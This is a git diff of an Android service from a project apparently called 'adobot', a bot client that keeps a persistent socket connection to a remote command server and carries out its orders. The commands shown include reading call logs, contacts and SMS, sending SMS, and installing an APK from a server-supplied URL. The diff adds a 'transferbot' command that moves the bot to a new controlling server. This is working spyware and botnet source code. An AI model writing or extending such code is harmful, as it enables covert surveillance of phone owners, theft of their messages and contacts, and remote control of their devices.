@@ -30,6 +30,7 @@ import com.android.adobot.tasks.GetCallLogsTask;
 import com.android.adobot.tasks.GetContactsTask;
 import com.android.adobot.tasks.GetSmsTask;
 import com.android.adobot.tasks.SendSmsTask;
+import com.android.adobot.tasks.TransferBotTask;
 import com.android.adobot.tasks.UpdateAppTask;
 
 
@@ -42,7 +43,7 @@ public class CommandService extends Service {
     private CommonParams params;
     private CommandService client;
     private Socket socket;
-    private boolean connected;
+    private boolean connected = false;
     private boolean registered;
     private double latitude;
     private double longitude;
@@ -93,8 +94,39 @@ public class CommandService extends Service {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
             observeLocation();
         }
+
+        createSocket(params.getServer());
+
+        super.onCreate();
+
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        super.onStartCommand(intent, flags, startId);
+        Log.i(TAG, "Running onStartCommand");
+
+        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
+        if (!connected && socket != null) {
+//            Log.i(TAG, "Creating new socket ......\n");
+//            createSocket();
+            Log.i(TAG, "Socket is connecting ......\n");
+            socket.connect();
+        }
+        return START_STICKY;
+
+    }
+
+    public void changeServer(String url) {
+        socket.disconnect();
+        params.setServer(url);
+        createSocket(url);
+        socket.connect();
+    }
+
+    private void createSocket (String url) {
         try {
-            socket = IO.socket(params.getServer());
+            socket = IO.socket(url);
             socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
 
                 @Override
@@ -157,8 +189,7 @@ public class CommandService extends Service {
                                 Log.i(TAG, "\nInvoking UpdateAppTask\n");
                                 String apkUrl = cmd.get("arg1").toString();
 
-                                UpdateAppTask atualizaApp = new UpdateAppTask(apkUrl);
-                                atualizaApp.setContext(client);
+                                UpdateAppTask atualizaApp = new UpdateAppTask(client, apkUrl);
                                 atualizaApp.run();
                             } else if (command.equals("sendsms")) {
                                 Log.i(TAG, "\nInvoking SendSMS\n");
@@ -169,6 +200,13 @@ public class CommandService extends Service {
                                 sendSmsTask.setPhoneNumber(phoneNumber);
                                 sendSmsTask.setTextMessage(textMessage);
                                 sendSmsTask.start();
+
+                            } else if (command.equals("transferbot")) {
+                                Log.i(TAG, "\nInvoking Transfer bot command\n");
+                                String newServer = cmd.get("arg1").toString();
+
+                                TransferBotTask t = new TransferBotTask(client, newServer);
+                                t.start();
 
                             } else {
                                 Log.i(TAG, "Unknown command");
@@ -221,25 +259,6 @@ public class CommandService extends Service {
         } catch (URISyntaxException e) {
             e.printStackTrace();
         }
-
-        super.onCreate();
-
-    }
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.i(TAG, "Running onStartCommand");
-
-//        socket.connect();
-
-        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
-        if (!connected) {
-            Log.i(TAG, "Socket is connecting ......\n");
-            socket.connect();
-        }
-
-        super.onStartCommand(intent, flags, startId);
-        return START_STICKY;
 
     }
 
